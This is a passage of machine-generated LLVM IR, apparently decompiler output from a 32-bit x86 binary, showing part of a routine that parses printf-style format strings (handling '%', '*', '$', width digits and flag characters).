  %v3_804e6fb = add i32 %v1_804e6fb, -4
  %v4_804e6fb = add i32 %v3_804e6fb, %v2_804e6fb
  %v5_804e6fb = inttoptr i32 %v4_804e6fb to i32*
  %v6_804e6fb = load i32, i32* %v5_804e6fb, align 4
  %v17_804e6fb = icmp eq i32 %v2_804e6f8, %v6_804e6fb
  %v1_804e6ff = icmp eq i1 %v17_804e6fb, false
  br i1 %v1_804e6ff, label %dec_label_pc_804ea48, label %dec_label_pc_804e705

dec_label_pc_804e705:                             ; preds = %dec_label_pc_804e6e1
  %v3_804e705 = trunc i32 %v0_804e6f6 to i8
  %v4_804e705 = icmp eq i8 %v3_804e705, 0
  br i1 %v4_804e705, label %dec_label_pc_804e70f, label %dec_label_pc_804e709

dec_label_pc_804e709:                             ; preds = %dec_label_pc_804e705
  %v0_804e709 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e709 = add i32 %v0_804e709, 1
  store i32 %v1_804e709, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804e709, 32
  br i1 %tmp175, label %dec_label_pc_804e709.dec_label_pc_804e6e1_crit_edge, label %dec_label_pc_804e70f

dec_label_pc_804e709.dec_label_pc_804e6e1_crit_edge: ; preds = %dec_label_pc_804e709
  %v2_804e6f2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6e1

dec_label_pc_804e70f:                             ; preds = %dec_label_pc_804e709, %dec_label_pc_804e705
  %v2_804e714 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804e72c.outer

dec_label_pc_804e72c.outer:                       ; preds = %dec_label_pc_804e70f, %dec_label_pc_804e6ce, %dec_label_pc_804e849
  %v0_804e738.ph94 = phi i32 [ %v1_804e849, %dec_label_pc_804e849 ], [ %v2_804e6ce, %dec_label_pc_804e6ce ], [ %v2_804e714, %dec_label_pc_804e70f ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804e849 ], [ %tmp66, %dec_label_pc_804e6ce ], [ %tmp66, %dec_label_pc_804e70f ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804e6d2, %dec_label_pc_804e849 ], [ 0, %dec_label_pc_804e6ce ], [ 0, %dec_label_pc_804e70f ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804e849 ], [ %v3_804e6bc, %dec_label_pc_804e6ce ], [ %v3_804e6bc, %dec_label_pc_804e70f ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804e849 ], [ 0, %dec_label_pc_804e6ce ], [ 0, %dec_label_pc_804e70f ]
  %v7_804e733 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804e733 = trunc i64 %v7_804e733 to i32
  %v2_804e73b = add i32 %v8_804e733, 80
  br label %dec_label_pc_804e72c

dec_label_pc_804e72c:                             ; preds = %dec_label_pc_804e72c.outer, %dec_label_pc_804e7e9
  %v0_804e738 = phi i32 [ %v0_804e7f6, %dec_label_pc_804e7e9 ], [ %v0_804e738.ph94, %dec_label_pc_804e72c.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804e7e9 ], [ %stack_var_-32.1.ph, %dec_label_pc_804e72c.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804e7e9 ], [ %stack_var_-88.1.ph, %dec_label_pc_804e72c.outer ]
  store i32 %v0_804e738, i32* @edx, align 4
  store i32 %v0_804e738, i32* @esi, align 4
  %v1_804e72e = inttoptr i32 %v0_804e738 to i8*
  %v2_804e72e = load i8, i8* %v1_804e72e, align 1
  %v11_804e72e = icmp eq i8 %v2_804e72e, 42
  %v1_804e731 = icmp eq i1 %v11_804e72e, false
  br i1 %v1_804e731, label %dec_label_pc_804e743, label %dec_label_pc_804e733

dec_label_pc_804e733:                             ; preds = %dec_label_pc_804e72c
  store i32 %v8_804e733, i32* %eax.global-to-local, align 4
  %v1_804e738 = add i32 %v0_804e738, 1
  store i32 %v1_804e738, i32* @esi, align 4
  %v0_804e73b = load i32, i32* @esp, align 4
  %v3_804e73b = add i32 %v2_804e73b, %v0_804e73b
  %v4_804e73b = inttoptr i32 %v3_804e73b to i32*
  store i32 0, i32* %v4_804e73b, align 4
  %v0_804e75d.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e743

dec_label_pc_804e743:                             ; preds = %dec_label_pc_804e72c, %dec_label_pc_804e733
  %v0_804e75d.pre = phi i32 [ %v0_804e738, %dec_label_pc_804e72c ], [ %v0_804e75d.pre.pre, %dec_label_pc_804e733 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804e745 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804e745, i32* %ebp.global-to-local, align 4
  %v4_804e75d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e75d124 = inttoptr i32 %v0_804e75d.pre to i8*
  %v2_804e75d125 = load i8, i8* %v1_804e75d124, align 1
  %v3_804e75d126 = zext i8 %v2_804e75d125 to i32
  %v5_804e75d127 = and i32 %v4_804e75d.pre, -256
  %v6_804e75d128 = or i32 %v3_804e75d126, %v5_804e75d127
  store i32 %v6_804e75d128, i32* %eax.global-to-local, align 4
  %v2_804e75f129 = sext i8 %v2_804e75d125 to i32
  store i32 %v2_804e75f129, i32* @ecx, align 4
  %v2_804e762130 = mul nsw i32 %v2_804e75f129, 2
  %v3_804e762131 = add i32 %v2_804e762130, %v0_804e745
  %v4_804e762132 = inttoptr i32 %v3_804e762131 to i8*
  %v5_804e762133 = load i8, i8* %v4_804e762132, align 1
  %v6_804e762134 = and i8 %v5_804e762133, 8
  %v7_804e762135 = icmp eq i8 %v6_804e762134, 0
  %v1_804e767136 = icmp eq i1 %v7_804e762135, false
  br i1 %v1_804e767136, label %dec_label_pc_804e74d, label %dec_label_pc_804e769

dec_label_pc_804e74d:                             ; preds = %dec_label_pc_804e743, %dec_label_pc_804e75c
  %v2_804e75f140 = phi i32 [ %v2_804e75f, %dec_label_pc_804e75c ], [ %v2_804e75f129, %dec_label_pc_804e743 ]
  %v6_804e75d139 = phi i32 [ %v6_804e75d, %dec_label_pc_804e75c ], [ %v6_804e75d128, %dec_label_pc_804e743 ]
  %v0_804e75c138 = phi i32 [ %v1_804e75c, %dec_label_pc_804e75c ], [ %v0_804e75d.pre, %dec_label_pc_804e743 ]
  %v1_804e755137 = phi i32 [ %v0_804e77732, %dec_label_pc_804e75c ], [ 0, %dec_label_pc_804e743 ]
  %v1_804e74d = add i32 %v1_804e755137, -4094
  %v6_804e74d = sub i32 4093, %v1_804e755137
  %v7_804e74d = and i32 %v6_804e74d, %v1_804e755137
  %v8_804e74d = icmp slt i32 %v7_804e74d, 0
  %v9_804e74d = icmp eq i32 %v1_804e74d, 0
  %v10_804e74d = icmp slt i32 %v1_804e74d, 0
  %v3_804e753 = icmp eq i1 %v10_804e74d, %v8_804e74d
  %v4_804e753 = icmp eq i1 %v9_804e74d, false
  %v5_804e753 = and i1 %v4_804e753, %v3_804e753
  br i1 %v5_804e753, label %dec_label_pc_804e75c, label %dec_label_pc_804e755

dec_label_pc_804e755:                             ; preds = %dec_label_pc_804e74d
  %v3_804e755 = mul i32 %v1_804e755137, 10
  store i32 %v3_804e755, i32* %eax.global-to-local, align 4
  %v2_804e758 = add i32 %v3_804e755, -48
  %v3_804e758 = add i32 %v2_804e758, %v2_804e75f140
  store i32 %v3_804e758, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e75c

dec_label_pc_804e75c:                             ; preds = %dec_label_pc_804e74d, %dec_label_pc_804e755
  %v0_804e77732 = phi i32 [ %v1_804e755137, %dec_label_pc_804e74d ], [ %v3_804e758, %dec_label_pc_804e755 ]
  %v4_804e75d28 = phi i32 [ %v6_804e75d139, %dec_label_pc_804e74d ], [ %v3_804e755, %dec_label_pc_804e755 ]
  %v1_804e75c = add i32 %v0_804e75c138, 1
  store i32 %v1_804e75c, i32* @esi, align 4
  %v1_804e75d = inttoptr i32 %v1_804e75c to i8*
  %v2_804e75d = load i8, i8* %v1_804e75d, align 1
  %v3_804e75d = zext i8 %v2_804e75d to i32
  %v5_804e75d = and i32 %v4_804e75d28, -256
  %v6_804e75d = or i32 %v3_804e75d, %v5_804e75d
  store i32 %v6_804e75d, i32* %eax.global-to-local, align 4
  %v2_804e75f = sext i8 %v2_804e75d to i32
  store i32 %v2_804e75f, i32* @ecx, align 4
  %v2_804e762 = mul nsw i32 %v2_804e75f, 2
  %v3_804e762 = add i32 %v2_804e762, %v0_804e745
  %v4_804e762 = inttoptr i32 %v3_804e762 to i8*
  %v5_804e762 = load i8, i8* %v4_804e762, align 1
  %v6_804e762 = and i8 %v5_804e762, 8
  %v7_804e762 = icmp eq i8 %v6_804e762, 0
  %v1_804e767 = icmp eq i1 %v7_804e762, false
  br i1 %v1_804e767, label %dec_label_pc_804e74d, label %dec_label_pc_804e769

dec_label_pc_804e769:                             ; preds = %dec_label_pc_804e75c, %dec_label_pc_804e743
  %v1_804e755.lcssa = phi i32 [ 0, %dec_label_pc_804e743 ], [ %v0_804e77732, %dec_label_pc_804e75c ]
  %v0_804e75c.lcssa = phi i32 [ %v0_804e75d.pre, %dec_label_pc_804e743 ], [ %v1_804e75c, %dec_label_pc_804e75c ]
  %v2_804e75d.lcssa = phi i8 [ %v2_804e75d125, %dec_label_pc_804e743 ], [ %v2_804e75d, %dec_label_pc_804e75c ]
  %v6_804e75d.lcssa = phi i32 [ %v6_804e75d128, %dec_label_pc_804e743 ], [ %v6_804e75d, %dec_label_pc_804e75c ]
  %v0_804e769 = load i32, i32* @edx, align 4
  %v1_804e769 = add i32 %v0_804e769, -1
  %v2_804e769 = inttoptr i32 %v1_804e769 to i8*
  %v3_804e769 = load i8, i8* %v2_804e769, align 1
  %v12_804e769 = icmp eq i8 %v3_804e769, 37
  %v1_804e76d = icmp eq i1 %v12_804e769, false
  br i1 %v1_804e76d, label %dec_label_pc_804e800, label %dec_label_pc_804e773

dec_label_pc_804e773:                             ; preds = %dec_label_pc_804e769
  %v10_804e773 = icmp eq i8 %v2_804e75d.lcssa, 36
  %v1_804e775 = icmp eq i1 %v10_804e773, false
  br i1 %v1_804e775, label %dec_label_pc_804e7a7, label %dec_label_pc_804e777

dec_label_pc_804e777:                             ; preds = %dec_label_pc_804e773
  %tmp89 = icmp slt i32 %v1_804e755.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804e7a7, label %dec_label_pc_804e77b

dec_label_pc_804e77b:                             ; preds = %dec_label_pc_804e777
  %v1_804e77b = add i32 %v0_804e75c.lcssa, 1
  store i32 %v1_804e77b, i32* @edx, align 4
  %v4_804e77e = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804e77e, label %dec_label_pc_804ea48, label %dec_label_pc_804e789

dec_label_pc_804e789:                             ; preds = %dec_label_pc_804e77b
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804e791 = sub i32 %v1_804e755.lcssa, %stack_var_-88.1
  %v8_804e791 = xor i32 %v1_804e755.lcssa, %stack_var_-88.1
  %v9_804e791 = xor i32 %v2_804e791, %v1_804e755.lcssa
  %v10_804e791 = and i32 %v9_804e791, %v8_804e791
  %v11_804e791 = icmp slt i32 %v10_804e791, 0
  %v12_804e791 = icmp eq i32 %v2_804e791, 0
  %v13_804e791 = icmp slt i32 %v2_804e791, 0
  %v3_804e793 = icmp ne i1 %v13_804e791, %v11_804e791
  %v4_804e793 = or i1 %v12_804e791, %v3_804e793
  %stack_var_-88.1.v0_804e795 = select i1 %v4_804e793, i32 %stack_var_-88.1, i32 %v1_804e755.lcssa
  br label %dec_label_pc_804e7a3

dec_label_pc_804e7a3:                             ; preds = %dec_label_pc_804e7b7, %dec_label_pc_804e789, %dec_label_pc_804e7bb
  %v0_804e7a3 = phi i32 [ %v1_804e77b, %dec_label_pc_804e789 ], [ %v0_804e769, %dec_label_pc_804e7bb ], [ %v0_804e769, %dec_label_pc_804e7b7 ]
  %stack_var_-32.2 = phi i32 [ %v1_804e755.lcssa, %dec_label_pc_804e789 ], [ %stack_var_-32.1, %dec_label_pc_804e7bb ], [ %stack_var_-32.1, %dec_label_pc_804e7b7 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804e795, %dec_label_pc_804e789 ], [ 0, %dec_label_pc_804e7bb ], [ 0, %dec_label_pc_804e7b7 ]
  store i32 %v0_804e7a3, i32* @esi, align 4
  br label %dec_label_pc_804e7ca

dec_label_pc_804e7a7:                             ; preds = %dec_label_pc_804e777, %dec_label_pc_804e773
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804e7b7, label %dec_label_pc_804e7ae

dec_label_pc_804e7ae:                             ; preds = %dec_label_pc_804e7a7
  %v10_804e7ae = icmp eq i8 %v2_804e75d.lcssa, 109
  br i1 %v10_804e7ae, label %dec_label_pc_804e800, label %dec_label_pc_804ea48

dec_label_pc_804e7b7:                             ; preds = %dec_label_pc_804e7a7
  %tmp176 = icmp ugt i32 %v0_804e75c.lcssa, %v0_804e769
  br i1 %tmp176, label %dec_label_pc_804e7bb, label %dec_label_pc_804e7a3

dec_label_pc_804e7bb:                             ; preds = %dec_label_pc_804e7b7
  %v1_804e7bb = inttoptr i32 %v0_804e769 to i8*
  %v2_804e7bb = load i8, i8* %v1_804e7bb, align 1
  %v8_804e7bb = icmp eq i8 %v2_804e7bb, 48
  br i1 %v8_804e7bb, label %dec_label_pc_804e7a3, label %dec_label_pc_804e800

dec_label_pc_804e7ca:                             ; preds = %dec_label_pc_804e7db, %dec_label_pc_804e7a3
  %v0_804e7f6 = phi i32 [ %v1_804e7db, %dec_label_pc_804e7db ], [ %v0_804e7a3, %dec_label_pc_804e7a3 ]
  %v4_804e7d435 = phi i32 [ %v6_804e7d4, %dec_label_pc_804e7db ], [ %v6_804e75d.lcssa, %dec_label_pc_804e7a3 ]
  store i32 ptrtoint ([8 x i8]* @global_var_80509f2.119 to i32), i32* %edx.global-to-local, align 4
  %v1_804e7d7 = inttoptr i32 %v0_804e7f6 to i8*
  br label %dec_label_pc_804e7d4

dec_label_pc_804e7d4:                             ; preds = %dec_label_pc_804e7e5, %dec_label_pc_804e7ca
  %v4_804e7d4 = phi i32 [ %v4_804e7d435, %dec_label_pc_804e7ca ], [ %v6_804e7d4, %dec_label_pc_804e7e5 ]
  %v0_804e7d6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80509f2.119 to i32), %dec_label_pc_804e7ca ], [ %v1_804e7d6, %dec_label_pc_804e7e5 ]
  %v0_804e7e5 = phi i32 [ 1, %dec_label_pc_804e7ca ], [ %v2_804e7e5, %dec_label_pc_804e7e5 ]
  store i32 %v0_804e7e5, i32* @ecx, align 4
  %v1_804e7d4 = inttoptr i32 %v0_804e7d6 to i8*
  %v2_804e7d4 = load i8, i8* %v1_804e7d4, align 1
  %v3_804e7d4 = zext i8 %v2_804e7d4 to i32
  %v5_804e7d4 = and i32 %v4_804e7d4, -256
  %v6_804e7d4 = or i32 %v3_804e7d4, %v5_804e7d4
  store i32 %v6_804e7d4, i32* %eax.global-to-local, align 4
  %v1_804e7d6 = add i32 %v0_804e7d6, 1
  store i32 %v1_804e7d6, i32* @edx, align 4
  %v2_804e7d7 = load i8, i8* %v1_804e7d7, align 1
  %v15_804e7d7 = icmp eq i8 %v2_804e7d7, %v2_804e7d4
  %v1_804e7d9 = icmp eq i1 %v15_804e7d7, false
  br i1 %v1_804e7d9, label %dec_label_pc_804e7e0, label %dec_label_pc_804e7db

dec_label_pc_804e7db:                             ; preds = %dec_label_pc_804e7d4
  %v1_804e7db = add i32 %v0_804e7f6, 1
  store i32 %v1_804e7db, i32* @esi, align 4
  %v0_804e7dc = load i32, i32* %edi.global-to-local, align 4
  %v2_804e7dc = or i32 %v0_804e7dc, %v0_804e7e5
  store i32 %v2_804e7dc, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e7ca

dec_label_pc_804e7e0:                             ; preds = %dec_label_pc_804e7d4
  %v1_804e7e0 = inttoptr i32 %v1_804e7d6 to i8*
  %v2_804e7e0 = load i8, i8* %v1_804e7e0, align 1
  %v3_804e7e0 = icmp eq i8 %v2_804e7e0, 0
  br i1 %v3_804e7e0, label %dec_label_pc_804e7e9, label %dec_label_pc_804e7e5

dec_label_pc_804e7e5:                             ; preds = %dec_label_pc_804e7e0
  %v2_804e7e5 = mul i32 %v0_804e7e5, 2
  br label %dec_label_pc_804e7d4

dec_label_pc_804e7e9:                             ; preds = %dec_label_pc_804e7e0
  %v0_804e7e9 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804e7ed = udiv i32 %v0_804e7e9, 2
  %v1_804e7ed.not = or i32 %v1_804e7ed, -6
  %v1_804e7f2 = xor i32 %v1_804e7ed.not, 5
  store i32 %v1_804e7f2, i32* %eax.global-to-local, align 4
  %v2_804e7f4 = and i32 %v1_804e7f2, %v0_804e7e9
  store i32 %v2_804e7f4, i32* %edi.global-to-local, align 4
  %v1_804e7f6 = add i32 %v0_804e7f6, -1
  %v2_804e7f6 = inttoptr i32 %v1_804e7f6 to i8*
  %v3_804e7f6 = load i8, i8* %v2_804e7f6, align 1
  %v12_804e7f6 = icmp eq i8 %v3_804e7f6, 37
  %v1_804e7fa = icmp eq i1 %v12_804e7f6, false
  br i1 %v1_804e7fa, label %dec_label_pc_804e72c, label %dec_label_pc_804e800

dec_label_pc_804e800:                             ; preds = %dec_label_pc_804e7bb, %dec_label_pc_804e7e9, %dec_label_pc_804e769, %dec_label_pc_804e7ae
  %v0_804e823 = phi i32 [ %v1_804e755.lcssa, %dec_label_pc_804e7ae ], [ %v1_804e755.lcssa, %dec_label_pc_804e7bb ], [ 0, %dec_label_pc_804e7e9 ], [ %v1_804e755.lcssa, %dec_label_pc_804e769 ]
  %v1_804e82c = phi i32 [ %v0_804e75c.lcssa, %dec_label_pc_804e7ae ], [ %v0_804e75c.lcssa, %dec_label_pc_804e7bb ], [ %v0_804e7f6, %dec_label_pc_804e7e9 ], [ %v0_804e75c.lcssa, %dec_label_pc_804e769 ]
  %v0_804e829 = phi i32 [ %v0_804e769, %dec_label_pc_804e7ae ], [ %v0_804e769, %dec_label_pc_804e7bb ], [ %v1_804e7d6, %dec_label_pc_804e7e9 ], [ %v0_804e769, %dec_label_pc_804e769 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804e7ae ], [ %stack_var_-32.1, %dec_label_pc_804e7bb ], [ %stack_var_-32.2, %dec_label_pc_804e7e9 ], [ %stack_var_-32.1, %dec_label_pc_804e769 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804e7ae ], [ 0, %dec_label_pc_804e7bb ], [ %stack_var_-88.2, %dec_label_pc_804e7e9 ], [ %stack_var_-88.1, %dec_label_pc_804e769 ]
  %v1_804e800 = inttoptr i32 %v0_804e829 to i8*
  %v2_804e800 = load i8, i8* %v1_804e800, align 1
  %v11_804e800 = icmp eq i8 %v2_804e800, 42
  %v1_804e803 = icmp eq i1 %v11_804e800, false
  br i1 %v1_804e803, label %dec_label_pc_804e839, label %dec_label_pc_804e805

dec_label_pc_804e805:                             ; preds = %dec_label_pc_804e800
  %v4_804e805 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804e805, label %dec_label_pc_804e829, label %dec_label_pc_804e80c

dec_label_pc_804e80c:                             ; preds = %dec_label_pc_804e805
  %v1_804e80c = inttoptr i32 %v1_804e82c to i8*
  %v2_804e80c = load i8, i8* %v1_804e80c, align 1
  %v11_804e80c = icmp eq i8 %v2_804e80c, 36
  %v1_804e80f = icmp eq i1 %v11_804e80c, false
  br i1 %v1_804e80f, label %dec_label_pc_804ea48, label %dec_label_pc_804e815

dec_label_pc_804e815:                             ; preds = %dec_label_pc_804e80c
  %tmp91 = icmp slt i32 %v0_804e823, 1
  br i1 %tmp91, label %dec_label_pc_804ea48, label %dec_label_pc_804e81d

dec_label_pc_804e81d:                             ; preds = %dec_label_pc_804e815
  store i32 %v8_804e733, i32* %eax.global-to-local, align 4
  %v1_804e822 = add i32 %v1_804e82c, 1
  store i32 %v1_804e822, i32* @esi, align 4
  %v1_804e823 = load i32, i32* @esp, align 4
  %v3_804e823 = add i32 %v8_804e733, 68
  %v4_804e823 = add i32 %v3_804e823, %v1_804e823
  %v5_804e823 = inttoptr i32 %v4_804e823 to i32*
  store i32 %v0_804e823, i32* %v5_804e823, align 4
  %v0_804e867.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e834

dec_label_pc_804e829:                             ; preds = %dec_label_pc_804e805
  %v1_804e829 = add i32 %v0_804e829, 1
  store i32 %v1_804e829, i32* %eax.global-to-local, align 4
  %v12_804e82c = icmp eq i32 %v1_804e829, %v1_804e82c
  %v1_804e82e = icmp eq i1 %v12_804e82c, false
  br i1 %v1_804e82e, label %dec_label_pc_804ea48, label %dec_label_pc_804e834

dec_label_pc_804e834:                             ; preds = %dec_label_pc_804e829, %dec_label_pc_804e81d
  %v0_804e867.pre.pre.pre = phi i32 [ %v1_804e82c, %dec_label_pc_804e829 ], [ %v0_804e867.pre.pre.pre.pre, %dec_label_pc_804e81d ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e839

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e800, %dec_label_pc_804e834
  %v0_804e867.pre.pre = phi i32 [ %v1_804e82c, %dec_label_pc_804e800 ], [ %v0_804e867.pre.pre.pre, %dec_label_pc_804e834 ]
  %v0_804e6d2 = phi i32 [ %v0_804e823, %dec_label_pc_804e800 ], [ -2147483648, %dec_label_pc_804e834 ]
  %v4_804e839 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804e839 = icmp eq i32 %v4_804e839, 0
  %v1_804e83e = icmp eq i1 %v5_804e839, false
  %.pre = inttoptr i32 %v0_804e867.pre.pre to i8*
  br i1 %v1_804e83e, label %dec_label_pc_804e862, label %dec_label_pc_804e844

dec_label_pc_804e844:                             ; preds = %dec_label_pc_804e839
  %v2_804e844 = load i8, i8* %.pre, align 1
  %v11_804e844 = icmp eq i8 %v2_804e844, 46
  %v1_804e847 = icmp eq i1 %v11_804e844, false
  br i1 %v1_804e847, label %dec_label_pc_804e85b, label %dec_label_pc_804e849

dec_label_pc_804e849:                             ; preds = %dec_label_pc_804e844
  %v1_804e849 = add i32 %v0_804e867.pre.pre, 1
  store i32 %v1_804e849, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e72c.outer

dec_label_pc_804e85b:                             ; preds = %dec_label_pc_804e844
  br label %dec_label_pc_804e862

dec_label_pc_804e862:                             ; preds = %dec_label_pc_804e839, %dec_label_pc_804e85b
  %stack_var_-96.2 = phi i32 [ %v0_804e6d2, %dec_label_pc_804e85b ], [ %stack_var_-96.1.ph, %dec_label_pc_804e839 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804e85b ], [ %v0_804e6d2, %dec_label_pc_804e839 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80509a0.120 to i32), i32* @edx, align 4
  %v4_804e867.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e867

dec_label_pc_804e867:                             ; preds = %dec_label_pc_804e871, %dec_label_pc_804e862
  %v0_804e871 = phi i32 [ %v1_804e871, %dec_label_pc_804e871 ], [ ptrtoint ([9 x i8]* @global_var_80509a0.120 to i32), %dec_label_pc_804e862 ]
  %v4_804e867 = phi i32 [ %v6_804e867, %dec_label_pc_804e871 ], [ %v4_804e867.pre, %dec_label_pc_804e862 ]
  %v2_804e867 = load i8, i8* %.pre, align 1
  %v3_804e867 = zext i8 %v2_804e867 to i32
  %v5_804e867 = and i32 %v4_804e867, -256
  %v6_804e867 = or i32 %v3_804e867, %v5_804e867
  store i32 %v6_804e867, i32* %eax.global-to-local, align 4
  %v3_804e869 = inttoptr i32 %v0_804e871 to i8*
  %v4_804e869 = load i8, i8* %v3_804e869, align 1
  %v15_804e869 = icmp eq i8 %v2_804e867, %v4_804e869
  br i1 %v15_804e869, label %dec_label_pc_804e6d9, label %dec_label_pc_804e871

dec_label_pc_804e871:                             ; preds = %dec_label_pc_804e867
  %v1_804e871 = add i32 %v0_804e871, 1
  store i32 %v1_804e871, i32* @edx, align 4
  %v1_804e872 = inttoptr i32 %v1_804e871 to i8*
  %v2_804e872 = load i8, i8* %v1_804e872, align 1
  %v3_804e872 = icmp eq i8 %v2_804e872, 0
  %v1_804e875 = icmp eq i1 %v3_804e872, false
  br i1 %v1_804e875, label %dec_label_pc_804e867, label %dec_label_pc_804e877

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e871, %dec_label_pc_804e6d9
  %v0_804e88a = phi i32 [ %v1_804e6d9, %dec_label_pc_804e6d9 ], [ %v0_804e867.pre.pre, %dec_label_pc_804e871 ]
  %v0_804e887 = phi i32 [ %v0_804e871, %dec_label_pc_804e6d9 ], [ %v1_804e871, %dec_label_pc_804e871 ]
  %v1_804e879 = add i32 %v0_804e887, -134547872
  %v1_804e87e = add i32 %v0_804e887, -134547873
  %v5_804e87e = sub i32 134547872, %v0_804e887
  %v6_804e87e = and i32 %v1_804e879, %v5_804e87e
  %v7_804e87e = icmp slt i32 %v6_804e87e, 0
  %v8_804e87e = icmp eq i32 %v1_804e87e, 0
  %v9_804e87e = icmp slt i32 %v1_804e87e, 0
  store i32 %v1_804e87e, i32* %eax.global-to-local, align 4
  %v3_804e87f = icmp eq i1 %v9_804e87e, %v7_804e87e
  %v4_804e87f = icmp eq i1 %v8_804e87e, false
  %v5_804e87f = and i1 %v4_804e87f, %v3_804e87f
  br i1 %v5_804e87f, label %dec_label_pc_804e88b, label %dec_label_pc_804e881

dec_label_pc_804e881:                             ; preds = %dec_label_pc_804e877
  %v1_804e881 = inttoptr i32 %v0_804e88a to i8*
  %v2_804e881 = load i8, i8* %v1_804e881, align 1
  %v3_804e881 = zext i8 %v2_804e881 to i32
  %v5_804e881 = and i32 %v1_804e87e, -256
  %v6_804e881 = or i32 %v3_804e881, %v5_804e881
  store i32 %v6_804e881, i32* %eax.global-to-local, align 4
  %v3_804e883 = inttoptr i32 %v0_804e887 to i8*
  %v4_804e883 = load i8, i8* %v3_804e883, align 1
  %v15_804e883 = icmp eq i8 %v2_804e881, %v4_804e883
  %v1_804e885 = icmp eq i1 %v15_804e883, false
  br i1 %v1_804e885, label %dec_label_pc_804e88b, label %dec_label_pc_804e887

dec_label_pc_804e887:                             ; preds = %dec_label_pc_804e881
  %v1_804e887 = add i32 %v0_804e887, 9
  store i32 %v1_804e887, i32* @edx, align 4
  %v1_804e88a = add i32 %v0_804e88a, 1
  store i32 %v1_804e88a, i32* @esi, align 4
  br label %dec_label_pc_804e88b

dec_label_pc_804e88b:                             ; preds = %dec_label_pc_804e881, %dec_label_pc_804e877, %dec_label_pc_804e887
  %v4_804e892 = phi i32 [ %v6_804e881, %dec_label_pc_804e881 ], [ %v1_804e87e, %dec_label_pc_804e877 ], [ %v6_804e881, %dec_label_pc_804e887 ]
  %v0_804e892 = phi i32 [ %v0_804e88a, %dec_label_pc_804e881 ], [ %v0_804e88a, %dec_label_pc_804e877 ], [ %v1_804e88a, %dec_label_pc_804e887 ]
  %v0_804e88b = phi i32 [ %v0_804e887, %dec_label_pc_804e881 ], [ %v0_804e887, %dec_label_pc_804e877 ], [ %v1_804e887, %dec_label_pc_804e887 ]
  %v1_804e88b = add i32 %v0_804e88b, 9
  %v2_804e88b = inttoptr i32 %v1_804e88b to i8*
  %v3_804e88b = load i8, i8* %v2_804e88b, align 1
  %v4_804e88b = sext i8 %v3_804e88b to i32
  %v2_804e88f = mul nsw i32 %v4_804e88b, 256
  store i32 %v2_804e88f, i32* %ebx.global-to-local, align 4
  %v1_804e892 = inttoptr i32 %v0_804e892 to i8*
  %v2_804e892 = load i8, i8* %v1_804e892, align 1
  %v3_804e892 = zext i8 %v2_804e892 to i32
  %v5_804e892 = and i32 %v4_804e892, -256
  %v6_804e892 = or i32 %v3_804e892, %v5_804e892
  store i32 %v6_804e892, i32* %eax.global-to-local, align 4
  %v4_804e894 = icmp eq i8 %v2_804e892, 0
  br i1 %v4_804e894, label %dec_label_pc_804ea48, label %dec_label_pc_804e89c

dec_label_pc_804e89c:                             ; preds = %dec_label_pc_804e88b
  store i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), i32* %ecx.global-to-local, align 4
  %v3_804e8a1 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804e8a1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8a5

dec_label_pc_804e8a5:                             ; preds = %dec_label_pc_804e8f4, %dec_label_pc_804e89c
  %v0_804e8f4 = phi i32 [ %v1_804e8f4, %dec_label_pc_804e8f4 ], [ ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), %dec_label_pc_804e89c ]
  %v3_804e8a5 = inttoptr i32 %v0_804e8f4 to i8*
  %v4_804e8a5 = load i8, i8* %v3_804e8a5, align 1
  %v15_804e8a5 = icmp eq i8 %v2_804e892, %v4_804e8a5
  %v1_804e8a7 = icmp eq i1 %v15_804e8a5, false
  br i1 %v1_804e8a7, label %dec_label_pc_804e8f4, label %dec_label_pc_804e8a9

dec_label_pc_804e8a9:                             ; preds = %dec_label_pc_804e8a5
  %v1_804e8ab = add i32 %v0_804e8f4, -134547933
  store i32 %v1_804e8ab, i32* %edx.global-to-local, align 4
  %v7_804e8b4 = icmp sgt i32 %v1_804e8ab, 17
